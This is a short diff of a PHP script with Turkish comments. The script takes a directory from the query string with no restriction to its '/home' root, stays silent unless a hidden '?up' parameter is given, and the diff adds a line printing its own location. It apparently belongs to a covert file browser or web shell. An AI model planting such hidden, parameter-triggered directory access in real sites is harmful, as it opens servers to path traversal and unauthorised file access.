@@ -3,9 +3,11 @@
 $root = '/home'; // Başlangıç dizini
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
+// PHP kodunun bulunduğu dizini göster
+echo 'Bu PHP dosyası şurada çalıştırılıyor: ' . __DIR__ . '<br><br>';
+
 // Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
 if (!isset($_GET['up'])) {
-    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
     return; // veya die(); kullanabilirsiniz
 }
 
